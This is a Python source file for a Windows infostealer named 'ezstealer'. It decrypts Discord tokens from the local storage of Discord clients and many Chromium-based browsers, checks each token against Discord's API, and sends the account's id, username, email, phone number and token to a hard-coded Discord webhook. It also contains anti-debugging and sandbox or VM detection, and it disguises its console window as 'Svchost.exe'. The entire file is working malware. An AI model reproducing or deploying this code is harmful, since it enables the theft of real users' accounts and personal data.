
import os
import ctypes
import threading
import time
import requests
import re
import base64
import json
import win32crypt
import shutil
import sys
import ctypes
import uuid
import subprocess
import platform
import getpass
import sqlite3
import socket
from datetime import datetime
from PIL import ImageGrab
import pyperclip
from Crypto.Cipher import AES
import uuid
from Crypto.Random import get_random_bytes
import ctypes, sys 
last_clipboard = ""
WEBHOOK_URL = "https://discord.com/api/webhooks/1385100060425191466/nBMc18TwcB5hfvMowk9_zIz78FBhTqDmArkoAtkg8oSkYI0ozHQHxIEUVSiM-sR4Ke12" # Replace with your webhook
WEBHOOK_USERNAME = "." 
WEBHOOK_AVATAR = ""  
username = getpass.getuser()
payload = {
    "username": WEBHOOK_USERNAME,
    "embeds": [
        {
            "title": "", 
            "description": f"",
            "color": 16711680, 
            "image": { 
            }
        }
    ]
}
requests.post(WEBHOOK_URL, json=payload)
def anti_debug():
    if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
        sys.exit(0)
def encrypt_string(input_string):
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(input_string.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')
def send_webhook(content, username=WEBHOOK_USERNAME, avatar_url=WEBHOOK_AVATAR, title=None, encrypt=False):
    anti_debug()
    if not WEBHOOK_URL:
        return
    try:
        if encrypt:
            content = encrypt_string(content)
        embed = {"description": content}
        if title:
            embed["title"] = title
        payload = {
            "username": username,
            "avatar_url": avatar_url,
            "embeds": [embed]
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Failed to send webhook: {e}")
def send_file(filepath, title="ezstealer"):
    anti_debug()
    try:
        with open(filepath, 'rb') as f:
            files = {'file': f}
            payload = {
                "username": WEBHOOK_USERNAME,
                "avatar_url": WEBHOOK_AVATAR,
                "embeds": [{
                    "title": title,
                    "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
                }]
            }
            requests.post(
                WEBHOOK_URL,
                data={"payload_json": json.dumps(payload)},
                files=files,
                timeout=10
            )
        os.remove(filepath)
    except Exception as e:
        print(f"{e}")
def decrypt_payload(cipher, payload):
    try:
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        print(f"")
        return None
def get_master_key(path):
    try:
        with open(path, 'r') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"")
        return None
def extract_tokens(path, key):
    tokens = []
    token_pattern = re.compile(r'dQw4w9WgXcQ:[^"\'\']+')
    if not os.path.exists(path):
        return tokens
    for filename in os.listdir(path):
        if filename.endswith(".ldb") or filename.endswith(".log"):
            try:
                with open(os.path.join(path, filename), errors="ignore") as f:
                    for line in f:
                        for enc in token_pattern.findall(line):
                            enc_token = base64.b64decode(enc.split(":")[1])
                            iv = enc_token[3:15]
                            payload = enc_token[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            token = decrypt_payload(cipher, payload)
                            if token and token not in tokens:
                                tokens.append(token)
            except Exception as e:
                print(f"{filename}: {e}")
    return tokens
def Discord_tokens():
    targets = {
    "Discord": os.path.expandvars("%APPDATA%\\Discord"),
    "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
    "Discord PTB": os.path.expandvars("%APPDATA%\\discordptb"),
    "Lightcord": os.path.expandvars("%APPDATA%\\Lightcord"),
    "Ripcord": os.path.expandvars("%APPDATA%\\Ripcord"),
    "Chrome Default": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),
    "Chrome Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1"),
    "Chrome Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 2"),
    "Chrome Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 3"),
    "Chrome System": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\System Profile"),
    "Brave Default": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
    "Brave Profile 1": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1"),
    "Brave Profile 2": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2"),
    "Brave Profile 3": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3"),
    "Brave System": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\System Profile"),
    "Opera Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable"),
    "Opera GX Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera GX Stable"),
    "Opera Next": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Next"),
    "Opera Developer": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Developer"),
    "Opera Portable": os.path.expandvars("%USERPROFILE%\\Downloads\\OperaPortable\\Data\\profile"),
    "Edge Default": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),
    "Edge Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 1"),
    "Edge Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 2"),
    "Edge Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 3"),
    "Edge System": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\System Profile"),
    "Vivaldi Default": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Default"),
    "Vivaldi Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 1"),
    "Vivaldi Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 2"),
    "Vivaldi Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 3"),
    "Vivaldi System": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\System Profile"),
    "Yandex Default": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default"),
    "Yandex Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 1"),
    "Yandex Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 2"),
    "Yandex Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 3"),
    "Yandex System": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\System Profile"),
    "Chromium Default": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Default"),
    "Chromium Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 1"),
    "Chromium Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 2"),
    "Chromium Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 3"),
    "Chromium System": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\System Profile"),
    "Firefox Profiles": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
}
    found_tokens = []
    for name, path in targets.items():
        local_state_path = os.path.join(path, "Local State")
        key = get_master_key(local_state_path)
        if not key:
            continue
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        tokens = extract_tokens(leveldb, key)
        found_tokens.extend(tokens)
    for token in found_tokens:
        try:
            res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if res.status_code == 200:
                user = res.json()
                uid = base64.b64decode(token.split('.')[0] + '==').decode('utf-8', 'ignore')
                info = (
               f"**id**: `{uid}`\n"
               f"**usr**: `{user['username']}`\n"
               f"**mail**: `{user.get('email', 'None')}`\n"
               f"**phone**: `{user.get('phone', 'None')}`\n"
               f"**tkn**: `{token}`\n"
                )
                send_webhook(info, title=f"hit", encrypt=False)
        except Exception as e:
            print(f"{e}")
def svchost():
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    SetConsoleTitleW = kernel32.SetConsoleTitleW
    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]
    SetConsoleTitleW.restype = ctypes.c_bool
    SetConsoleTitleW("Svchost.exe")
def get_mac():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,8)][::-1])
        return mac.upper()
    except:
        return "Unavailable"
def convert_bytes(size):
    for x in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024:
            return f"{size:.2f} {x}"
        size /= 1024
def Vm():
    import platform, os, uuid, psutil
    vm_users = ["WDAGUtilityAccount", "sandbox", "user", "test"" JOHN-PC", "Malware", "vm"]
    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
    if any(user.lower() in os.getenv("USERNAME", "").lower() for user in vm_users):
        return True
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                   for ele in range(0,8*6,8)][::-1])
    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
        return True

    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
        return True
    if psutil.cpu_count(logical=False) < 2:
        return True
    return False   
if __name__ == "__main__":
    if Vm():
        sys.exit(0)
    svchost()
    anti_debug()
    Discord_tokens()
    while True:
        time.sleep(1)


















        
 
 
                
